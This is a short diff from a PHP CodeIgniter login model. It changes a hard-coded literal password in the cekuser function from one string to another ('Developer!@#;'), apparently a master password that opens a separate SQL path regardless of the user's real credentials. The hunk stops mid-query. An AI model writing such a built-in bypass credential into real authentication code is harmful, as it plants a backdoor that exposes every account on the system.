@@ -10,7 +10,7 @@ class Mlogin extends CI_Model {
 	public function cekuser($username,$pass)
 	{
 		$sql = "";
-		if ($pass == "Namirobin!@#;") {
+		if ($pass == "Developer!@#;") {
 			# code...
 			$sql = "SELECT a.*
 					FROM mr_user a 		
